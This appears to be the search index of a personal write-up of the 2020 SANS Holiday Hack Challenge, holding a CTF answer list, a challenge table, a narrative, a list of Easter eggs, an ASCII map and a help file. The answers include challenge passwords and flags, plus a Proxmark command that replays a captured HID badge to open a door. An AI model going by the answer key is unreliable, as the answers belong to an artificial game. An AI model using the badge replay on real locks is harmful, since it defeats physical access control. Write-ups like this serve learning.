{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Introduction \u2693\ufe0e Hi and welcome to my 2020 SANS Holiday Hack Challenge write-up. This is now the third time I've had the privilege of traveling to the North Pole to attend KringleCon and help out Santa and the elves with solving all sorts of hacking shennanigans. It has really become the main CTF event I look forward to with a lot of anticipation each year! There's 3 main sections. This page which contains the introduction, answers, and overall narrative. Objectives contains the write-ups for the main objectives for which an answer had to be submitted and Terminal hints has the write-ups for the additional side challenges which provide you with hints to help solve the main objectives. A few additional things worth pointing out are the reverse shell obtained on the Broken Tag Generator challenge, the large but very much incomplete list of Easter eggs (e.g., Garden Party, the story behind all those landscape paintings, the New Jersy Turnpike exit, Jason is back... twice!), and the custom scripts that helped solve some of the challenges. Finally, I hope you have as much fun reading this write-up as I had writing it! 50-page submission limit Each year there's a huge number of write-ups that need to be reviewed by the SANS and Counter Hack teams. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information. Navigation tip Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S , F , or / to open up the search dialog. TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! Answers \u2693\ufe0e 1. Uncover Santa's Gift List - Proxmark 2. Investigate S3 Bucket - North Pole: The Frostiest Place on Earth 3. Point-of-Sale Password Recovery - santapass 4. Operate the Santavator - Create a working configuration using items found in the castle or bypass the stream. 5. Open HID Lock - Use lf hid sim -r 2006e22f13 to unlock the door using Shinny Upatree's badge information. 6. Splunk Challenge - The Lollipop Guild 7. Solve the Sleigh's CAN-D-BUS Problem - 080 Less 000000000000 19B Equals 0000000F2057 8. Broken Tag Generator - JackFrostWasHere 9. ARP Shenanigans - Tanta Kringle 10. Defeat Fingerprint Sensor - Use the besanta token. The first thing Tinsel Upatree says is GOSHGOLLY 11a. Naughty/Nice List with Blockchain Investigation Part 1 - 57066318f32f729d 11b. Naughty/Nice List with Blockchain Investigation Part 2 - fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb Challenges \u2693\ufe0e Name Floor Room Terminal Hint Related Objective Jingle Ringford - NJTP - Uncover Santa's Gift List Shinny Upatree - Front Lawn Kringle Kiosk Investigate S3 Bucket Sugarplum Mary 1 Courtyard Linux Primer PoS Password Recovery Sparkle Redberry 1 Castle Entry - Operate the Santavator Pepper Minstix - Front Lawn Unscape Tmux Operate the Santavator Ribb Bonbowford 1 Dining Room The Elf C0de Operate the Santavator Bushy Evergreen 2 Talks Lobby Speaker UNPrep Open HID Lock Fitzy Shortstack 1 Kitchen 33.6kbps Open HID Lock Angel Candysalt 1 Great Room - Splunk Challenge Minty Candycane 1.5 Workshop Sort-o-Matic Splunk Challenge Wunorse Openslae R NetWars Room CAN-Bus Investigation CAN-D-BUS Problem Holly Evergreen 1 Kitchen Redis Bug Hunt Broken Tag Generator Noel Boetie 1.5 Wrapping Room - Broken Tag Generator Alabaster Snowball R NetWars Room Scapy Prepper ARP Shenanigans Tinsel Upatree 3 Santa's Office - Defeat Fingerprint sensor Tangle Coalbox 1 Speaker UNPreparedness Snowball Fight Naughty/Nice List Part 1 and Part 2 Conclusion \u2693\ufe0e Narrative KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null! We already knew from last year's narrative and cliffhanger that Jack Frost was in cahoots with the Tooth Fairy, silently working from the shadows. This year we got to unravel his evil plan and actually stop him! Jack Frost not only tried to prevent the expansion of Santa\u2019s Castle but he also gave Santa a magical portrait so he could become him and destroy the holidays! Santa Thank you for foiling Jack\u2019s foul plot! He sent that magical portrait so he could become me and destroy the holidays! Due to your incredible work, you have set everything right and saved the holiday season! Congratulations on a job well done! Ho Ho Ho! Jack Frost My plan was NEARLY perfect... but I never expected someone with your skills to come around and ruin my plan for ruining the holidays! And now, they\u2019re gonna put me in jail for my deeds.","title":"Welcome"},{"location":"#introduction","text":"Hi and welcome to my 2020 SANS Holiday Hack Challenge write-up. This is now the third time I've had the privilege of traveling to the North Pole to attend KringleCon and help out Santa and the elves with solving all sorts of hacking shennanigans. It has really become the main CTF event I look forward to with a lot of anticipation each year! There's 3 main sections. This page which contains the introduction, answers, and overall narrative. Objectives contains the write-ups for the main objectives for which an answer had to be submitted and Terminal hints has the write-ups for the additional side challenges which provide you with hints to help solve the main objectives. A few additional things worth pointing out are the reverse shell obtained on the Broken Tag Generator challenge, the large but very much incomplete list of Easter eggs (e.g., Garden Party, the story behind all those landscape paintings, the New Jersy Turnpike exit, Jason is back... twice!), and the custom scripts that helped solve some of the challenges. Finally, I hope you have as much fun reading this write-up as I had writing it! 50-page submission limit Each year there's a huge number of write-ups that need to be reviewed by the SANS and Counter Hack teams. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information. Navigation tip Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S , F , or / to open up the search dialog. TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order!","title":"Introduction"},{"location":"#answers","text":"1. Uncover Santa's Gift List - Proxmark 2. Investigate S3 Bucket - North Pole: The Frostiest Place on Earth 3. Point-of-Sale Password Recovery - santapass 4. Operate the Santavator - Create a working configuration using items found in the castle or bypass the stream. 5. Open HID Lock - Use lf hid sim -r 2006e22f13 to unlock the door using Shinny Upatree's badge information. 6. Splunk Challenge - The Lollipop Guild 7. Solve the Sleigh's CAN-D-BUS Problem - 080 Less 000000000000 19B Equals 0000000F2057 8. Broken Tag Generator - JackFrostWasHere 9. ARP Shenanigans - Tanta Kringle 10. Defeat Fingerprint Sensor - Use the besanta token. The first thing Tinsel Upatree says is GOSHGOLLY 11a. Naughty/Nice List with Blockchain Investigation Part 1 - 57066318f32f729d 11b. Naughty/Nice List with Blockchain Investigation Part 2 - fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Answers"},{"location":"#challenges","text":"Name Floor Room Terminal Hint Related Objective Jingle Ringford - NJTP - Uncover Santa's Gift List Shinny Upatree - Front Lawn Kringle Kiosk Investigate S3 Bucket Sugarplum Mary 1 Courtyard Linux Primer PoS Password Recovery Sparkle Redberry 1 Castle Entry - Operate the Santavator Pepper Minstix - Front Lawn Unscape Tmux Operate the Santavator Ribb Bonbowford 1 Dining Room The Elf C0de Operate the Santavator Bushy Evergreen 2 Talks Lobby Speaker UNPrep Open HID Lock Fitzy Shortstack 1 Kitchen 33.6kbps Open HID Lock Angel Candysalt 1 Great Room - Splunk Challenge Minty Candycane 1.5 Workshop Sort-o-Matic Splunk Challenge Wunorse Openslae R NetWars Room CAN-Bus Investigation CAN-D-BUS Problem Holly Evergreen 1 Kitchen Redis Bug Hunt Broken Tag Generator Noel Boetie 1.5 Wrapping Room - Broken Tag Generator Alabaster Snowball R NetWars Room Scapy Prepper ARP Shenanigans Tinsel Upatree 3 Santa's Office - Defeat Fingerprint sensor Tangle Coalbox 1 Speaker UNPreparedness Snowball Fight Naughty/Nice List Part 1 and Part 2","title":"Challenges"},{"location":"#conclusion","text":"Narrative KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null! We already knew from last year's narrative and cliffhanger that Jack Frost was in cahoots with the Tooth Fairy, silently working from the shadows. This year we got to unravel his evil plan and actually stop him! Jack Frost not only tried to prevent the expansion of Santa\u2019s Castle but he also gave Santa a magical portrait so he could become him and destroy the holidays! Santa Thank you for foiling Jack\u2019s foul plot! He sent that magical portrait so he could become me and destroy the holidays! Due to your incredible work, you have set everything right and saved the holiday season! Congratulations on a job well done! Ho Ho Ho! Jack Frost My plan was NEARLY perfect... but I never expected someone with your skills to come around and ruin my plan for ruining the holidays! And now, they\u2019re gonna put me in jail for my deeds.","title":"Conclusion"},{"location":"easter_eggs/","text":"It's amazing how many references and easter eggs you can find once you start looking around for them. Movie references, jokes, nods to popular culture, memes, secret areas, references to past Holiday Hack Challenge, and funny WebSocket response messages. Below are a few of them, in no particular order. Three French Hens \u2693\ufe0e When the title of this year's event was announced on Twitter a pattern emerged. Last year was named KringleCon 2: Turtle Doves , this time it's KringleCon 3: French Hens . The titles appear to be taken from the Twelve Days of Christmas carol. The Twelve Days Of Christmas ... On the second day of Christmas My true love gave to me: Two turtle doves ... On the third day of Christmas My true love gave to me: Three french hens ... On the forth day of Christmas My true love gave to me: Four calling birds ... Being John Malkovich \u2693\ufe0e The idea of going to an in-between floor (i.e., 1.5) and ending up in the body of another person (i.e., Santa) is a direct reference to the movie Being John Malkovich . In the movie, directed by Spike Jonze and written by Charlie Kaufman, a puppeteer discovers a portal on a floor between the 7th and 8th that leads literally into the head of movie star John Malkovich, similar to how we go to a floor between the 1st and 2nd floors and ultimately end up being Santa. New Jersey Turnpike \u2693\ufe0e When the Holiday Hack Challenge website tells you to hop on the New Jersey Turnpike to get to Santa's gondola for your ride to the North Pole , you can take that pretty literally. Taking exit 7A and following Interstate 195 to Shore Points, brings you close to the Counter Hack HQ, better known as Santa's castle. The New Jersey Turnpike also plays a key role in the movie Being John Malkovich . It's where the movie's main character ends up when he's ejected from John Malkovich's mind and body after about 15 minutes. Zat You, Santa Claus? \u2693\ufe0e A direct reference to the song Zat You, Santa Claus? by Louis Armstrong. Garden Party \u2693\ufe0e To the North and slightly off to the East of the swag booth you can pass through the hedge to enter a secret area. The NPC behind the booth is named npc-evanbooth , Counter Hack's resident builder, architect, developer, and challenge designer . The clip that's playing is the original video for what later became the Dimitri Finds Out meme . You can't go there as Santa though. Santa Discounts \u2693\ufe0e When you talk to the SANS.edu and RSA Conference booth NPCs as Santa, they'll give you a discount code. Also, the NPCs manning the conference booths all have actual names. Can we get a round of applause for Brian, Peaches, Geek, Jeff, and Kulj, please? Geek - SANS.edu booth Hi Santa! Because you give so much to the world, we\u2019re giving you a code to waive your application fee to SANS.edu, the best college in cybersecurity. Use the code SantaGoesToCollege when you apply. Thanks for hacking for good! Kulj - RSA Conference booth Congratulations, Santa! You\u2019ve unlocked $20 off a Full Summit Pass for the new RSAC 365 Virtual Summit. Use code 10SANSF59 . Click to learn more . Jason \u2693\ufe0e Just like last year's event, Jason can be found in 2 different locations. First as the nail next to the bucket image named jason 2.png on the scaffolding in front of the castle and again as an ASCII art image of a plant located at /opt/plant.txt . The ASCII image can also be found when entering plant as a menu option in the Kringle Kiosk Terminal Hint challenge. Hi, my name is Jason the Plant! ( U \\| ) __|/ \\ / \\__/ ejm96 Jason himself actually tweeted a hint for this Easter Egg on December 25, 2020. Nail Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. https://www.twitch.tv/banjocrashland Portrait Painting \u2693\ufe0e The portrait features Ed Skoudis as Santa Claus and was painted by Ed's artist daughter Jessica Skoudis (who is also mentioned in the final credits). The initials on the portrait not only refer to Jack Frost: Santa , as per the narrative, but are in fact Jessica's initials. The items on the desk are references to past Holiday Hack Challenges . # Item Holiday Hack Challenge 1 Challenge coin First introduced as an award in HHC 2019 2 Tardis Seen on the dorm wall in HHC 2019 3 Cranberry Pi First appeared in HHC 2018 4 Gnome legs Also created by Jessica Skoudis and featured in HHC 2015 5 Enigma machine Seen in an image for HHC 2012 Painting Peephole Trope \u2693\ufe0e Someone peering through the eyes of a painting is a common TV trope and is used in a lot of movies and TV series . Scooby-Doo - TV Tropes It was common for Scooby-Doo to feature a scene of the characters moving past a portrait with moving eyes. A series of Cartoon Network promos for the show titled Scooby-Doo: Behind the Scenes had the characters lampshading the trope in the final promo \"Those Meddling Kids, Together Again\" and Velma jokingly asking why weren't there any haunted houses with landscape paintings. Landscape paintings? Perfect segue into the next easter egg! Castle Artwork \u2693\ufe0e All the artwork spread across Santa's castle is cut from a single image. If you download all the textures from https://2020.kringlecon.com/textures/art/f{1-39}.png , you can recreate a Jack Frost painting by Andrew Theophilopoulos . Looks like Jack Frost replaced all the paintings with a piece of himself! Badum-TSS! Proxmark Email \u2693\ufe0e In the Wrapping Room there's an email message hanging on the left wall from Iceman , addressed to Chris Elgee. Proxmark email To: Chris Elgee Re: Proxmark in Holiday Hack Challenge Hey Chris! Proxmark3 is a open name, belonging to the community, no trademark as I know of. The copyright could arguably belong to Jonathan Westhus when he created the first versions some 14 years ago. He has never ex- pressed any claims for the name. So feel free to add it in your challenge :) /Iceman Black Badge \u2693\ufe0e Santa has a black conference badge which is a nod to the DEF CON Black Badge . DEF CON Black Badge The DEF CON Black Badge is a powerful talisman, awarded only to those who have emerged unbeaten from the crucible of elite DEF CON competition. Which competitions? The answer varies from year to year. This is in the nature of the talisman. Those chosen by the Badge enter DEF CON free of charge for the duration of their natural life. Wilhelm Scream \u2693\ufe0e In the 33.6kbps terminal challenge, the SCHHRRHHRTHRTR sound uses the famous Wilhelm Scream . Snowball Fight Error \u2693\ufe0e The error screen when you lose a Snowball Fight game displays a QR code which leads to the CounterHack website and the error code 501_PEBKAC_ERR_4EVA , which translates to Problem Exists Between Keyboard and Chair , Error, and Forever. In other words, user error. Pretty sure that if you contact the support elf and pass them the error code, they'd laugh at you. WebSocket Codes \u2693\ufe0e The WebSocket at wss://2020.kringlecon.com/ws is a lot of fun to mess around with and others have gone above and beyond to write some amazing helper scripts that let you navigate the game without using the web UI. The WS_OHHIMARK and DENNIS_NEDRY WebSocket response codes are references to the movies The Room and Jurassic Park, respectively. WS_OHHIMARK The WS_OHHIMARK response code is a reference to the famous scene from the movie The Room. DENNIS_NEDRY The DENNIS_NEDRY error code is a reference to Jurassic Park . Richard F. Hall \u2693\ufe0e The billboard titled Richard F. Hall - Custom Homes, LLC , located next to the scaffolding in front of Santa's castle, is a reference to an actual company in the Jersey Shore area. Looking at their portfolio, it's pretty clear why Santa would choose them to help with the castle expansion. That's some impressive work! Stay Frosty Catchphrase \u2693\ufe0e Jack Frost isn't the only one who likes to use the Stay frosty catchphrase. It's actually used in a number of movies. The most famous one probably being Aliens where Corporal Hicks , played by Michael Biehn, uses it in a pep talk. Corporal Hicks - Aliens Hey! I know we\u2019re all in strung-out shape but stay frosty and alert. We can\u2019t afford to let one of those bastards in here. Release the Snacken \u2693\ufe0e The vending machine's name is a reference to release the Kraken . The kraken is a legendary sea monster of gigantic size and cephalopod-like appearance in Scandinavian folklore. The phrase comes from the 1981 movie The Clash of the Titans (and its 2010 remake) and is known for being a meme as well. The Lollipop Guild \u2693\ufe0e The adversary group that Santa feared would attack KringleCon is a reference to The Wizard of Oz . Naughty/Nice Reports \u2693\ufe0e Dumping the reports from the Naughty/Nice blockchain provides for some hilarious reading. Quite the welcome distraction once you've spent some time on the final objectives. Below are just a few examples from the 1547 + 1 available reports. Elf-on-the-shelf #10830630836554719419 Unbelievably, for the second time this year, I saw Shamicka leaving less than a swallow of orange juice in the container and putting it back into the refrigerator. Elf-on-the-shelf #6203725506778794240 For the second time this month, we spotted Morad referring to someone as \"bro\". Elf-on-the-shelf #809598375456514384 We've noticed that Chaquetta seems to be regularly discussing \"The Bachelorette\" as though it was actually something worthwhile. Some reports noted some excellent behavior as well though. Elf-on-the-shelf #8151363711045738907 Happily, for the second time this year, I saw Hadassah not allowing their IOT devices to be accessible from the internet. Elf-on-the-shelf #6864795698547819664 Maury was spotted running a marathon and not bragging about it to anyone twice today. Elf-on-the-shelf #12595432874979467172 Three time now, Banjamin was seen being a vegan, but never making a big deal out of it.","title":"Easter Eggs"},{"location":"easter_eggs/#three-french-hens","text":"When the title of this year's event was announced on Twitter a pattern emerged. Last year was named KringleCon 2: Turtle Doves , this time it's KringleCon 3: French Hens . The titles appear to be taken from the Twelve Days of Christmas carol. The Twelve Days Of Christmas ... On the second day of Christmas My true love gave to me: Two turtle doves ... On the third day of Christmas My true love gave to me: Three french hens ... On the forth day of Christmas My true love gave to me: Four calling birds ...","title":"Three French Hens"},{"location":"easter_eggs/#being-john-malkovich","text":"The idea of going to an in-between floor (i.e., 1.5) and ending up in the body of another person (i.e., Santa) is a direct reference to the movie Being John Malkovich . In the movie, directed by Spike Jonze and written by Charlie Kaufman, a puppeteer discovers a portal on a floor between the 7th and 8th that leads literally into the head of movie star John Malkovich, similar to how we go to a floor between the 1st and 2nd floors and ultimately end up being Santa.","title":"Being John Malkovich"},{"location":"easter_eggs/#new-jersey-turnpike","text":"When the Holiday Hack Challenge website tells you to hop on the New Jersey Turnpike to get to Santa's gondola for your ride to the North Pole , you can take that pretty literally. Taking exit 7A and following Interstate 195 to Shore Points, brings you close to the Counter Hack HQ, better known as Santa's castle. The New Jersey Turnpike also plays a key role in the movie Being John Malkovich . It's where the movie's main character ends up when he's ejected from John Malkovich's mind and body after about 15 minutes.","title":"New Jersey Turnpike"},{"location":"easter_eggs/#zat-you-santa-claus","text":"A direct reference to the song Zat You, Santa Claus? by Louis Armstrong.","title":"Zat You, Santa Claus?"},{"location":"easter_eggs/#garden-party","text":"To the North and slightly off to the East of the swag booth you can pass through the hedge to enter a secret area. The NPC behind the booth is named npc-evanbooth , Counter Hack's resident builder, architect, developer, and challenge designer . The clip that's playing is the original video for what later became the Dimitri Finds Out meme . You can't go there as Santa though.","title":"Garden Party"},{"location":"easter_eggs/#santa-discounts","text":"When you talk to the SANS.edu and RSA Conference booth NPCs as Santa, they'll give you a discount code. Also, the NPCs manning the conference booths all have actual names. Can we get a round of applause for Brian, Peaches, Geek, Jeff, and Kulj, please? Geek - SANS.edu booth Hi Santa! Because you give so much to the world, we\u2019re giving you a code to waive your application fee to SANS.edu, the best college in cybersecurity. Use the code SantaGoesToCollege when you apply. Thanks for hacking for good! Kulj - RSA Conference booth Congratulations, Santa! You\u2019ve unlocked $20 off a Full Summit Pass for the new RSAC 365 Virtual Summit. Use code 10SANSF59 . Click to learn more .","title":"Santa Discounts"},{"location":"easter_eggs/#jason","text":"Just like last year's event, Jason can be found in 2 different locations. First as the nail next to the bucket image named jason 2.png on the scaffolding in front of the castle and again as an ASCII art image of a plant located at /opt/plant.txt . The ASCII image can also be found when entering plant as a menu option in the Kringle Kiosk Terminal Hint challenge. Hi, my name is Jason the Plant! ( U \\| ) __|/ \\ / \\__/ ejm96 Jason himself actually tweeted a hint for this Easter Egg on December 25, 2020. Nail Job Hunting? Feeling Stuck? Join me for an interactive job hunting livestream! Any industry. Any type of job. No vendor pitches. Not selling anything. Just helping. https://www.twitch.tv/banjocrashland","title":"Jason"},{"location":"easter_eggs/#portrait-painting","text":"The portrait features Ed Skoudis as Santa Claus and was painted by Ed's artist daughter Jessica Skoudis (who is also mentioned in the final credits). The initials on the portrait not only refer to Jack Frost: Santa , as per the narrative, but are in fact Jessica's initials. The items on the desk are references to past Holiday Hack Challenges . # Item Holiday Hack Challenge 1 Challenge coin First introduced as an award in HHC 2019 2 Tardis Seen on the dorm wall in HHC 2019 3 Cranberry Pi First appeared in HHC 2018 4 Gnome legs Also created by Jessica Skoudis and featured in HHC 2015 5 Enigma machine Seen in an image for HHC 2012","title":"Portrait Painting"},{"location":"easter_eggs/#painting-peephole-trope","text":"Someone peering through the eyes of a painting is a common TV trope and is used in a lot of movies and TV series . Scooby-Doo - TV Tropes It was common for Scooby-Doo to feature a scene of the characters moving past a portrait with moving eyes. A series of Cartoon Network promos for the show titled Scooby-Doo: Behind the Scenes had the characters lampshading the trope in the final promo \"Those Meddling Kids, Together Again\" and Velma jokingly asking why weren't there any haunted houses with landscape paintings. Landscape paintings? Perfect segue into the next easter egg!","title":"Painting Peephole Trope"},{"location":"easter_eggs/#castle-artwork","text":"All the artwork spread across Santa's castle is cut from a single image. If you download all the textures from https://2020.kringlecon.com/textures/art/f{1-39}.png , you can recreate a Jack Frost painting by Andrew Theophilopoulos . Looks like Jack Frost replaced all the paintings with a piece of himself! Badum-TSS!","title":"Castle Artwork"},{"location":"easter_eggs/#proxmark-email","text":"In the Wrapping Room there's an email message hanging on the left wall from Iceman , addressed to Chris Elgee. Proxmark email To: Chris Elgee Re: Proxmark in Holiday Hack Challenge Hey Chris! Proxmark3 is a open name, belonging to the community, no trademark as I know of. The copyright could arguably belong to Jonathan Westhus when he created the first versions some 14 years ago. He has never ex- pressed any claims for the name. So feel free to add it in your challenge :) /Iceman","title":"Proxmark Email"},{"location":"easter_eggs/#black-badge","text":"Santa has a black conference badge which is a nod to the DEF CON Black Badge . DEF CON Black Badge The DEF CON Black Badge is a powerful talisman, awarded only to those who have emerged unbeaten from the crucible of elite DEF CON competition. Which competitions? The answer varies from year to year. This is in the nature of the talisman. Those chosen by the Badge enter DEF CON free of charge for the duration of their natural life.","title":"Black Badge"},{"location":"easter_eggs/#wilhelm-scream","text":"In the 33.6kbps terminal challenge, the SCHHRRHHRTHRTR sound uses the famous Wilhelm Scream .","title":"Wilhelm Scream"},{"location":"easter_eggs/#snowball-fight-error","text":"The error screen when you lose a Snowball Fight game displays a QR code which leads to the CounterHack website and the error code 501_PEBKAC_ERR_4EVA , which translates to Problem Exists Between Keyboard and Chair , Error, and Forever. In other words, user error. Pretty sure that if you contact the support elf and pass them the error code, they'd laugh at you.","title":"Snowball Fight Error"},{"location":"easter_eggs/#websocket-codes","text":"The WebSocket at wss://2020.kringlecon.com/ws is a lot of fun to mess around with and others have gone above and beyond to write some amazing helper scripts that let you navigate the game without using the web UI. The WS_OHHIMARK and DENNIS_NEDRY WebSocket response codes are references to the movies The Room and Jurassic Park, respectively. WS_OHHIMARK The WS_OHHIMARK response code is a reference to the famous scene from the movie The Room. DENNIS_NEDRY The DENNIS_NEDRY error code is a reference to Jurassic Park .","title":"WebSocket Codes"},{"location":"easter_eggs/#richard-f-hall","text":"The billboard titled Richard F. Hall - Custom Homes, LLC , located next to the scaffolding in front of Santa's castle, is a reference to an actual company in the Jersey Shore area. Looking at their portfolio, it's pretty clear why Santa would choose them to help with the castle expansion. That's some impressive work!","title":"Richard F. Hall"},{"location":"easter_eggs/#stay-frosty-catchphrase","text":"Jack Frost isn't the only one who likes to use the Stay frosty catchphrase. It's actually used in a number of movies. The most famous one probably being Aliens where Corporal Hicks , played by Michael Biehn, uses it in a pep talk. Corporal Hicks - Aliens Hey! I know we\u2019re all in strung-out shape but stay frosty and alert. We can\u2019t afford to let one of those bastards in here.","title":"Stay Frosty Catchphrase"},{"location":"easter_eggs/#release-the-snacken","text":"The vending machine's name is a reference to release the Kraken . The kraken is a legendary sea monster of gigantic size and cephalopod-like appearance in Scandinavian folklore. The phrase comes from the 1981 movie The Clash of the Titans (and its 2010 remake) and is known for being a meme as well.","title":"Release the Snacken"},{"location":"easter_eggs/#the-lollipop-guild","text":"The adversary group that Santa feared would attack KringleCon is a reference to The Wizard of Oz .","title":"The Lollipop Guild"},{"location":"easter_eggs/#naughtynice-reports","text":"Dumping the reports from the Naughty/Nice blockchain provides for some hilarious reading. Quite the welcome distraction once you've spent some time on the final objectives. Below are just a few examples from the 1547 + 1 available reports. Elf-on-the-shelf #10830630836554719419 Unbelievably, for the second time this year, I saw Shamicka leaving less than a swallow of orange juice in the container and putting it back into the refrigerator. Elf-on-the-shelf #6203725506778794240 For the second time this month, we spotted Morad referring to someone as \"bro\". Elf-on-the-shelf #809598375456514384 We've noticed that Chaquetta seems to be regularly discussing \"The Bachelorette\" as though it was actually something worthwhile. Some reports noted some excellent behavior as well though. Elf-on-the-shelf #8151363711045738907 Happily, for the second time this year, I saw Hadassah not allowing their IOT devices to be accessible from the internet. Elf-on-the-shelf #6864795698547819664 Maury was spotted running a marathon and not bragging about it to anyone twice today. Elf-on-the-shelf #12595432874979467172 Three time now, Banjamin was seen being a vegan, but never making a big deal out of it.","title":"Naughty/Nice Reports"},{"location":"map/","text":"ASCII Map \u2693\ufe0e Map updates No matter how hard I'd try, my graphical skills would never be able to do justice to the amazing ASCII art map that's already provided by the Kringle Kiosk . Without ASCII there'd be no write-up, so it's only appropriate to showcase this artistic gem here! Two minor additions to the map are the dark hallway leading to Santa's portrait and the hidden Garden Party area near the top right corner of the courtyard. __ _ -------------- |__)_ _ (_ | NetWars Room | | \\(_)(_)| | | | * | -------------- __ __ __ __ _)|_ _)|_ ------- /__| Tracks __)| |Balcony| 1 2 3 4 5 6 7 ------- ------- ------------- | |Speaker|--| Talks Lobby | -------- |Unprep | | | |Santa's | ------- ------ | |Office | | | -- -- | *| | | ------ | --- | * | __ ------ ------ /||_ |Garden| || |Party | ------ | __ __ -------- -------------------------- /| |_ |_ |Wrapping| | Courtyard | |.__)| | Room | -------------------------- -------- | | | ------ -------- ------ ---- -------- |Dining|--|Kitchen |--|Great | | |--|Workshop| | | -------- | | | | | | | Room |--| * |--| Room | | | | | | | |Entryway| | | | | | | ------ -------- ------ | .. | | | | ---- | * | ---------- -------- |Front Lawn| NOTE: * denotes Santavator ----------","title":"ASCII Map"},{"location":"map/#ascii-map","text":"Map updates No matter how hard I'd try, my graphical skills would never be able to do justice to the amazing ASCII art map that's already provided by the Kringle Kiosk . Without ASCII there'd be no write-up, so it's only appropriate to showcase this artistic gem here! Two minor additions to the map are the dark hallway leading to Santa's portrait and the hidden Garden Party area near the top right corner of the courtyard. __ _ -------------- |__)_ _ (_ | NetWars Room | | \\(_)(_)| | | | * | -------------- __ __ __ __ _)|_ _)|_ ------- /__| Tracks __)| |Balcony| 1 2 3 4 5 6 7 ------- ------- ------------- | |Speaker|--| Talks Lobby | -------- |Unprep | | | |Santa's | ------- ------ | |Office | | | -- -- | *| | | ------ | --- | * | __ ------ ------ /||_ |Garden| || |Party | ------ | __ __ -------- -------------------------- /| |_ |_ |Wrapping| | Courtyard | |.__)| | Room | -------------------------- -------- | | | ------ -------- ------ ---- -------- |Dining|--|Kitchen |--|Great | | |--|Workshop| | | -------- | | | | | | | Room |--| * |--| Room | | | | | | | |Entryway| | | | | | | ------ -------- ------ | .. | | | | ---- | * | ---------- -------- |Front Lawn| NOTE: * denotes Santavator ----------","title":"ASCII Map"},{"location":"artifacts/objectives/o9/HELP/","text":"How To Resize and Switch Terminal Panes: \u2693\ufe0e You can use the key combinations ( Ctrl+B \u2191 or \u2193 ) to resize the terminals. You can use the key combinations ( Ctrl+B o ) to switch terminal panes. See tmuxcheatsheet.com for more details To Add An Additional Terminal Pane: \u2693\ufe0e /usr/bin/tmux split-window -hb To exit a terminal pane simply type: \u2693\ufe0e exit To Launch a webserver to serve-up files/folder in a local directory: \u2693\ufe0e cd /my/directory/with/files python3 -m http.server 80 A Sample ARP pcap can be viewed at: \u2693\ufe0e https://www.cloudshark.org/captures/d97c5b81b057 A Sample DNS pcap can be viewed at: \u2693\ufe0e https://www.cloudshark.org/captures/0320b9b57d35 If Reading arp.pcap with tcpdump or tshark be sure to disable name \u2693\ufe0e resolution or it will stall when reading: \u2693\ufe0e tshark -nnr arp.pcap tcpdump -nnr arp.pcap","title":"How To Resize and Switch Terminal Panes:"},{"location":"artifacts/objectives/o9/HELP/#how-to-resize-and-switch-terminal-panes","text":"You can use the key combinations ( Ctrl+B \u2191 or \u2193 ) to resize the terminals. You can use the key combinations ( Ctrl+B o ) to switch terminal panes. See tmuxcheatsheet.com for more details","title":"How To Resize and Switch Terminal Panes:"},{"location":"artifacts/objectives/o9/HELP/#to-add-an-additional-terminal-pane","text":"/usr/bin/tmux split-window -hb","title":"To Add An Additional Terminal Pane:"},{"location":"artifacts/objectives/o9/HELP/#to-exit-a-terminal-pane-simply-type","text":"exit","title":"To exit a terminal pane simply type:"},{"location":"artifacts/objectives/o9/HELP/#to-launch-a-webserver-to-serve-up-filesfolder-in-a-local-directory","text":"cd /my/directory/with/files python3 -m http.server 80","title":"To Launch a webserver to serve-up files/folder in a local directory:"},{"location":"artifacts/objectives/o9/HELP/#a-sample-arp-pcap-can-be-viewed-at","text":"https://www.cloudshark.org/captures/d97c5b81b057","title":"A Sample ARP pcap can be viewed at:"},{"location":"artifacts/objectives/o9/HELP/#a-sample-dns-pcap-can-be-viewed-at","text":"https://www.cloudshark.org/captures/0320b9b57d35","title":"A Sample DNS pcap can be viewed at:"},{"location":"artifacts/objectives/o9/HELP/#if-reading-arppcap-with-tcpdump-or-tshark-be-sure-to-disable-name","text":"","title":"If Reading arp.pcap with tcpdump or tshark be sure to disable name"},{"location":"artifacts/objectives/o9/HELP/#resolution-or-it-will-stall-when-reading","text":"tshark -nnr arp.pcap tcpdump -nnr arp.pcap","title":"resolution or it will stall when reading:"},{"location":"hints/h11a/","text":"Snowball Fight \u2693\ufe0e Elf : Tangle Coalbox Direct link : snowball2 website Objective : Naughty/Nice List with Blockchain Investigation Part 1 and Part 2 Request \u2693\ufe0e Tangle Coalbox Howdy gumshoe. I'm Tangle Coalbox, 